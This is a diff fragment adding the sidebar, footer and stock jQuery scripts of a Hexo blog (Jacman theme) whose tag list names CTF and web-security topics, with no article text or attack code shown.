+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
